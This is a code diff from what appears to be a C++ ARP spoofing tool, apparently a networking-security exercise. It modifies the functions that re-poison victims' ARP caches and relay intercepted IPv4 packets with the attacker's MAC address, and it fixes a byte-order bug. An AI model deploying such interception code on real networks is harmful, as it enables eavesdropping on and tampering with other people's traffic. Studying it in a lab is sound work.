@@ -129,7 +129,7 @@ int main(int argc, char *argv[]) {
         cin.get(c);
 
     running.store(false);
-    cout << "Ending process" << endl;
+    cout << "Ending process..." << endl;
     this_thread::sleep_for(chrono::seconds(2));
 
 
@@ -291,8 +291,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
         if (eth_type == EthHdr::Arp) {
             EthArpPacket* arp_pkt = reinterpret_cast<EthArpPacket*>(buf);
             //sender -> taregt ARP request
-            if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->arp_.op() == ArpHdr::Request
-                && arp_pkt->arp_.sip() == sender_ip && arp_pkt->arp_.tip() == target_ip)
+            if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->arp_.op() == ArpHdr::Request)
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
@@ -304,7 +303,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
         else if (eth_type == EthHdr::Ip4) {
             // IPv4 패킷 처리 (sender → target 만 relay)
             IpHdr* iphdr = reinterpret_cast<IpHdr*>(buf + sizeof(EthHdr));
-            if (iphdr->sip_ == sender_ip && iphdr->dip_ == target_ip)
+            if (ntohl(iphdr->sip_) == sender_ip && ntohl(iphdr->dip_) == target_ip)
             {
                 ethhdr->smac_ = attack_mac;
                 ethhdr->dmac_ = target_mac;
